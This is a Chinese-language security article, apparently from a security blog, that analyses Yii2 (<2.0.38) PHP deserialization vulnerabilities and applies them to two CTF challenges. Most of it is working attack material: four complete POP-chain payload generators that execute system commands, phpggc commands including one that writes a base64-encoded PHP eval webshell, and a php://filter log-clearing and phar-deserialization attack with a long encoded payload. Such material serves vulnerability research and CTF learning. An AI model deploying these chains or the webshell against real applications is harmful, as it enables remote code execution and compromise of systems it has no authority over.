## 简介

`Yii`是一套基于组件、用于开发大型 Web 应用的高性能 PHP 框架，`Yii2
2.0.38`之前的版本存在反序列化漏洞，程序在调用`unserialize()`时，攻击者可通过构造特定的恶意请求执行任意命令，本篇就分析一下`yii2`利用链以及如何自己去构造`payload`，并结合CTF题目去学习`yii2`框架

## Yii2＜2.0.38反序列化

安装：在 <https://github.com/yiisoft/yii2/releases>下载`2.0.37`的版本

然后在`yii-basic-app-2.0.37\basic\config\web.php`里面往`cookieValidationKey`随意给点值，运行`php yii
serve`，新建一个控制器

`yii-basic-app-2.0.37\basic\controllers\TestController.php`

    
    
    <?php  
    namespace app\controllers;  
    use yii\web\Controller;  
    ​  
    class TestController extends Controller{  
    public function actionTest($name){  
    return unserialize($name);  
    }  
    }

就可以进行测试了

    
    
    ?r=test/test&name=

### 链一

链的入口在

`yii-basic-app-2.0.37\basic\vendor\yiisoft\yii2\db\BatchQueryResult.php`

    
    
    public function __destruct()  
    {  
    // make sure cursor is closed  
    $this->reset();  
    }

跟进`$this->reset();`

    
    
    public function reset()  
    {  
    if ($this->_dataReader !== null) {  
    $this->_dataReader->close();  
    }

这里的`$this->_dataReader`可控，并调用了`close()`方法，那么可以找到一个类不存在`close()`方法，但存在`__call`方法就可以调用他了

在`yii-basic-app-2.0.37\basic\vendor\yiisoft\yii2-gii\src\Generator.php`

    
    
    public function __call($method, $attributes)  
    {  
    return $this->format($method, $attributes);  
    }

这里的`$method`为`close`，`$attributes`为空，继续跟进`format`

    
    
    public function format($formatter, $arguments = array())  
    {  
    return call_user_func_array($this->getFormatter($formatter), $arguments);  
    }

跟进`getFormatter`

    
    
    public function getFormatter($formatter)  
    {  
    if (isset($this->formatters[$formatter])) {  
    return $this->formatters[$formatter];  
    }

似曾相识的代码，`laravel5.8`某条链就出现过，这里`$this->formatters`可控，也就是`$this->getFormatter($formatter)`这这个可控，但是`$arguments`的值我们无法控制，值为空

到这里可以执行`phpinfo`了

    
    
    <?php  
    namespace yii\db{  
    class BatchQueryResult{  
    private $_dataReader;  
    public function __construct($_dataReader) {  
    $this->_dataReader = $_dataReader;  
    }  
    }  
    }  
    namespace Faker{  
    class Generator{  
    protected $formatters = array();  
    public function __construct($formatters) {  
    $this->formatters = $formatters;  
    }  
    }  
    }  
    namespace {  
    $a = new Faker\Generator(array('close'=>'phpinfo'));  
    $b = new yii\db\BatchQueryResult($a);  
    print(urlencode(serialize($b)));  
    }

但是我们想要`rce`的话，还要在`yii2`中已有的无参方法中进行挖掘

这里我们可以使用正则匹配直接搜索含有`call_user_function`的无参函数

    
    
    call_user_func\(\$this->([a-zA-Z0-9]+), \$this->([a-zA-Z0-9]+)

然后找到下面两个都比较好用

    
    
    yii-basic-app-2.0.37\basic\vendor\yiisoft\yii2\rest\IndexAction.php  
    public function run()  
    {  
    if ($this->checkAccess) {  
    call_user_func($this->checkAccess, $this->id);  
    }  
    ​  
    return $this->prepareDataProvider();  
    }  
    ​  
    yii-basic-app-2.0.37\basic\vendor\yiisoft\yii2\rest\CreateAction.php  
    public function run()  
    {  
    if ($this->checkAccess) {  
    call_user_func($this->checkAccess, $this->id);  
    }

这里的`$this->checkAccess`和`$this->id`都是我们可控的

所以直接构造就行了

    
    
    <?php  
    namespace yii\db{  
    class BatchQueryResult{  
    private $_dataReader;  
    public function __construct($_dataReader) {  
    $this->_dataReader = $_dataReader;  
    }  
    }  
    }  
    namespace Faker{  
    class Generator{  
    protected $formatters = array();  
    public function __construct($formatters) {  
    $this->formatters = $formatters;  
    }  
    }  
    }  
    namespace yii\rest{  
    class CreateAction{  
    public $checkAccess;  
    public $id;  
    public function __construct($checkAccess,$id){  
    $this->checkAccess = $checkAccess;  
    $this->id = $id;  
    }  
    }  
    }  
    namespace {  
    $c = new yii\rest\CreateAction('system','whoami');  
    $b = new Faker\Generator(array('close'=>array($c, 'run')));  
    $a = new yii\db\BatchQueryResult($b);  
    print(urlencode(serialize($a)));  
    }

![headImg.action?news=d4225ba0-404a-45cd-bbed-c0fb356178af.png](https://image.3001.net/images/20210618/1623978835_60cbf353379428dcf5cf5.png!small)

### 链二

这个是`yii2 2.0.37`的另外一条链

起点和链一相同，是`BatchQueryResult`类的`__destruct`，然后是`$this->_dataReader->close()`，但是这里不找`__call`，我们去找存在`close`方法的类

找到`yii-basic-app-2.0.37\basic\vendor\yiisoft\yii2\web\DbSession.php`

    
    
    class DbSession extends MultiFieldSession  
    {  
    ...  
    public function close()  
    {  
    if ($this->getIsActive()) {  
    // prepare writeCallback fields before session closes  
    $this->fields = $this->composeFields();

这里跟进`$this->composeFields()`

    
    
    abstract class MultiFieldSession extends Session  
    {  
    protected function composeFields($id = null, $data = null)  
    {  
    $fields = $this->writeCallback ? call_user_func($this->writeCallback, $this) : [];

这里`$this->writeCallback`可控，`$this`是一个对象，所以这里调`phpinfo`的话应该不行，不过可以续上链一的`run`方法（即那个无参的方法）

这里直接构造即可

    
    
    <?php  
    namespace yii\db{  
    class BatchQueryResult{  
    private $_dataReader;  
    public function __construct($_dataReader) {  
    $this->_dataReader = $_dataReader;  
    }  
    }  
    }  
    namespace yii\web{  
    class DbSession{  
    public $writeCallback;  
    public function __construct($writeCallback) {  
    $this->writeCallback = $writeCallback;  
    }  
    }  
    }  
    namespace yii\rest{  
    class CreateAction{  
    public $checkAccess;  
    public $id;  
    public function __construct($checkAccess,$id){  
    $this->checkAccess = $checkAccess;  
    $this->id = $id;  
    }  
    }  
    }  
    namespace {  
    $c = new yii\rest\CreateAction('system','whoami');  
    $b = new yii\web\DbSession(array($c, 'run'));  
    $a = new yii\db\BatchQueryResult($b);  
    print(urlencode(serialize($a)));  
    }

### 链三

我们可以在`yii2 2.0.38`的`commit`看到他加了一个`__wakeup`

![headImg.action?news=7574bec3-0432-4075-9b3b-c9bd97170cb1.png](https://image.3001.net/images/20210618/1623978838_60cbf35601c9c2a779f02.png!small)

这里限制了链一的起点`BatchQueryResult`无法使用，后面的`__call`的链没有被破坏，所以我们继续寻找一个`__destruct`

`yii-basic-app-2.0.37\basic\vendor\codeception\codeception\ext\RunProcess.php`

    
    
    public function __destruct()  
    {  
    $this->stopProcess();  
    }

这里继续跟进`stopProcess`

    
    
    public function stopProcess()  
    {  
    foreach (array_reverse($this->processes) as $process) {  
    /** @var $process Process  **/  
    if (!$process->isRunning()) {  
    continue;  
    }

这里的`$this->processes`可控，所以可以利用`$process->isRunning()`来进行触发`__call`

后面的利用就和链一相同了

    
    
    <?php  
    namespace Codeception\Extension{  
    class RunProcess{  
    private $processes = [];  
    public function __construct($processes) {  
    $this->processes[] = $processes;  
    }  
    }  
    }  
    namespace Faker{  
    class Generator{  
    protected $formatters = array();  
    public function __construct($formatters) {  
    $this->formatters = $formatters;  
    }  
    }  
    }  
    namespace yii\rest{  
    class CreateAction{  
    public $checkAccess;  
    public $id;  
    public function __construct($checkAccess,$id){  
    $this->checkAccess = $checkAccess;  
    $this->id = $id;  
    }  
    }  
    }  
    namespace {  
    $c = new yii\rest\CreateAction('system','whoami');  
    $b = new Faker\Generator(array('isRunning'=>array($c, 'run')));  
    $a = new Codeception\Extension\RunProcess($b);  
    print(urlencode(serialize($a)));  
    }

### 链四

同样的先找`__destruct`

`yii-basic-app-2.0.37\basic\vendor\swiftmailer\swiftmailer\lib\classes\Swift\KeyCache\DiskKeyCache.php`

    
    
    public function __destruct()  
    {  
    foreach ($this->keys as $nsKey => $null) {  
    $this->clearAll($nsKey);  
    }  
    }

这里`$nsKey`可控，跟进`clearAll`

    
    
    public function clearAll($nsKey)  
    {  
    if (array_key_exists($nsKey, $this->keys)) {  
    foreach ($this->keys[$nsKey] as $itemKey => $null) {  
    $this->clearKey($nsKey, $itemKey);  
    }  
    if (is_dir($this->path.'/'.$nsKey)) {  
    rmdir($this->path.'/'.$nsKey);  
    }  
    unset($this->keys[$nsKey]);  
    }  
    }

这里没有触发`__call`的地方，但是存在字符串的拼接，可以触发`__toString`

随便找找就找到了`yii-basic-app-2.0.37\basic\vendor\codeception\codeception\src\Codeception\Util\XmlBuilder.php`

    
    
    public function __toString()  
    {  
    return $this->__dom__->saveXML();  
    }

同样用他去触发`__call`

    
    
    <?php  
    namespace {  
    class Swift_KeyCache_DiskKeyCache{  
    private $path;  
    private $keys = [];  
    public function __construct($path,$keys) {  
    $this->path = $path;  
    $this->keys = $keys;  
    }  
    }  
    }  
    namespace Codeception\Util{  
    class XmlBuilder{  
    protected $__dom__;  
    public function __construct($__dom__) {  
    $this->__dom__ = $__dom__;  
    }  
    }  
    }  
    namespace Faker{  
    class Generator{  
    protected $formatters = array();  
    public function __construct($formatters) {  
    $this->formatters = $formatters;  
    }  
    }  
    }  
    namespace yii\rest{  
    class CreateAction{  
    public $checkAccess;  
    public $id;  
    public function __construct($checkAccess,$id){  
    $this->checkAccess = $checkAccess;  
    $this->id = $id;  
    }  
    }  
    }  
    namespace {  
    $c = new yii\rest\CreateAction('system','whoami');  
    $b = new Faker\Generator(array('saveXML'=>array($c,'run')));  
    $a = new Codeception\Util\XmlBuilder($b);  
    $d = new Swift_KeyCache_DiskKeyCache($a,array('kawhi'=>'kawhi'));  
    print(urlencode(serialize($d)));  
    }

![headImg.action?news=6d6f5fb3-831e-496d-9804-a456f1a9685b.png](https://image.3001.net/images/20210618/1623978839_60cbf3572b927450102ad.png!small)

### phpggc

使用`./phpggc -l yii2`可以看到有两条`yii2`的链

![headImg.action?news=af519bed-be61-4649-9d94-fdfd0c15b4f9.png](https://image.3001.net/images/20210618/1623978840_60cbf3580c21c6460ace6.png!small)

可以使用如下命令快速得到链，`-u`指`url`编码

    
    
    ./phpggc Yii2/RCE1 system id -u

`phpggc`的链二的终点是一个`eval`，所以这里可以直接写`shell`，`-b`指`base64`编码

    
    
    ./phpggc Yii2/RCE2 'file_put_contents("shell.php",base64_decode("PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4="));' -b

## CTF题目

### [HMBCTF 2021]framework

把题目附件解压，看到`html\controllers\SiteController.php`

    
    
    class SiteController extends Controller  
    {  
    public function actionAbout($message = 'Hello')  
    {  
    $data = base64_decode($message);  
    unserialize($data);  
    }

这里可以这样传参

    
    
    ?r=site/about&message=

拿链一打了一下，发现一下`system`等函数被`ban`

![headImg.action?news=a6783d6b-3093-4709-9578-fb7ed6bd1c6a.png](https://image.3001.net/images/20210618/1623978840_60cbf358e387f8e2e060a.png!small)

这里用`phpggc
yii2`的链二写一个`shell`进去，然后用蚁剑的`apache/mod`绕`disable`，运行`/readflag`即可获取`flag`

### [CISCN2021 Quals]filter

据说这是配置文件里面的重要内容，或许对你有用！！

    
    
    'log' => [  
    'traceLevel' => YII_DEBUG ? 0 : 0,  
    'targets' => [  
    [  
    'class' => 'yii\log\FileTarget',  
    'levels' => ['error'],  
    'logVars' => [],  
    ],  
    ],  
    ],

看到附件的`SiteController.php`就改了这个地方

    
    
    public function actionIndex()  
    {  
    $file = Yii::$app->request->get('file');  
    $res = file_get_contents($file);  
    file_put_contents($file,$res);  
    return $this->render('index');  
    }

`yii`框架的`runtime/logs`目录下有一个`app.log`

看一下依赖发现`monolog`符合

    
    
    "require": {  
    "php": ">=5.6.0",  
    "yiisoft/yii2": "~2.0.14",  
    "yiisoft/yii2-bootstrap": "~2.0.0",  
    "yiisoft/yii2-swiftmailer": "~2.0.0 || ~2.1.0",  
    "monolog/monolog":"1.19"  
    },

首先清空日志文件

    
    
    ?file=php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../runtime/logs/app.log

`phpggc`生成

    
    
    php -d'phar.readonly=0' ./phpggc Monolog/RCE1 "phpinfo" "1" --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"

写入日志，注意最后面要加个字符`a`

    
    
    /?file==50=00=44=00=39=00=77=00=61=00=48=00=41=00=67=00=58=00=31=00=39=00=49=00=51=00=55=00=78=00=55=00=58=00=30=00=4E=00=50=00=54=00=56=00=42=00=4A=00=54=00=45=00=56=00=53=00=4B=00=43=00=6B=00=37=00=49=00=44=00=38=00=2B=00=44=00=51=00=71=00=39=00=41=00=67=00=41=00=41=00=41=00=67=00=41=00=41=00=41=00=42=00=45=00=41=00=41=00=41=00=41=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=6D=00=41=00=67=00=41=00=41=00=54=00=7A=00=6F=00=7A=00=4D=00=6A=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=46=00=4E=00=35=00=63=00=32=00=78=00=76=00=5A=00=31=00=56=00=6B=00=63=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=45=00=36=00=65=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=32=00=39=00=6A=00=61=00=32=00=56=00=30=00=49=00=6A=00=74=00=50=00=4F=00=6A=00=49=00=35=00=4F=00=69=00=4A=00=4E=00=62=00=32=00=35=00=76=00=62=00=47=00=39=00=6E=00=58=00=45=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=4A=00=63=00=51=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=53=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=36=00=4E=00=7A=00=70=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=47=00=46=00=75=00=5A=00=47=00=78=00=6C=00=63=00=69=00=49=00=37=00=54=00=7A=00=6F=00=79=00=4F=00=54=00=6F=00=69=00=54=00=57=00=39=00=75=00=62=00=32=00=78=00=76=00=5A=00=31=00=78=00=49=00=59=00=57=00=35=00=6B=00=62=00=47=00=56=00=79=00=58=00=45=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=6A=00=63=00=36=00=65=00=33=00=4D=00=36=00=4D=00=54=00=41=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=68=00=68=00=62=00=6D=00=52=00=73=00=5A=00=58=00=49=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=55=00=32=00=6C=00=36=00=5A=00=53=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=6B=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=69=00=49=00=37=00=59=00=54=00=6F=00=78=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=78=00=4F=00=69=00=49=00=78=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=63=00=47=00=68=00=77=00=61=00=57=00=35=00=6D=00=62=00=79=00=49=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=54=00=61=00=58=00=70=00=6C=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4F=00=54=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=45=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=45=00=36=00=49=00=6A=00=45=00=69=00=4F=00=33=00=4D=00=36=00=4E=00=54=00=6F=00=69=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=66=00=58=00=31=00=7A=00=4F=00=6A=00=67=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=6C=00=75=00=61=00=58=00=52=00=70=00=59=00=57=00=78=00=70=00=65=00=6D=00=56=00=6B=00=49=00=6A=00=74=00=69=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=59=00=6E=00=56=00=6D=00=5A=00=6D=00=56=00=79=00=54=00=47=00=6C=00=74=00=61=00=58=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=78=00=4D=00=7A=00=6F=00=69=00=41=00=43=00=6F=00=41=00=63=00=48=00=4A=00=76=00=59=00=32=00=56=00=7A=00=63=00=32=00=39=00=79=00=63=00=79=00=49=00=37=00=59=00=54=00=6F=00=79=00=4F=00=6E=00=74=00=70=00=4F=00=6A=00=41=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=6A=00=64=00=58=00=4A=00=79=00=5A=00=57=00=35=00=30=00=49=00=6A=00=74=00=70=00=4F=00=6A=00=45=00=37=00=63=00=7A=00=6F=00=33=00=4F=00=69=00=4A=00=77=00=61=00=48=00=42=00=70=00=62=00=6D=00=5A=00=76=00=49=00=6A=00=74=00=39=00=66=00=58=00=30=00=46=00=41=00=41=00=41=00=41=00=5A=00=48=00=56=00=74=00=62=00=58=00=6B=00=45=00=41=00=41=00=41=00=41=00=47=00=59=00=61=00=33=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=49=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=43=00=35=00=30=00=65=00=48=00=51=00=45=00=41=00=41=00=41=00=41=00=47=00=59=00=61=00=33=00=59=00=41=00=51=00=41=00=41=00=41=00=41=00=4D=00=66=00=6E=00=2F=00=59=00=70=00=41=00=45=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=42=00=30=00=5A=00=58=00=4E=00=30=00=64=00=47=00=56=00=7A=00=64=00=4A=00=41=00=61=00=47=00=73=00=75=00=53=00=31=00=47=00=68=00=54=00=49=00=2B=00=6B=00=4B=00=58=00=33=00=45=00=68=00=2B=00=4D=00=44=00=71=00=54=00=76=00=6E=00=6F=00=41=00=67=00=41=00=41=00=41=00=45=00=64=00=43=00=54=00=55=00=49=00=3D=00a
    

保留`phar`的内容

    
    
    /?file=php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../runtime/logs/app.log
    

最后用`phar`协议打一下

    
    
    /?file=phar://../runtime/logs/app.log/test.txt
    

![headImg.action?news=7bc3e1a4-93e4-4902-82b5-48d8d514a2d5.png](https://image.3001.net/images/20210618/1623978841_60cbf3599789dd650bf7b.png!small)

然后在根目录找到`This_is_flaaagggg`

然后用这个找一下`flag`即可

    
    
    php -d'phar.readonly=0' ./phpggc Monolog/RCE1 "system" "cat /This_is_flaaagggg" --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())"
    

本文涉及相关实验：[PHP反序列化漏洞实验](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182016010714511600001&pk_campaign=freebuf-wemedia)（通过本次实验，大家将会明白什么是反序列化漏洞，反序列化漏洞的成因以及如何挖掘和预防此类漏洞。

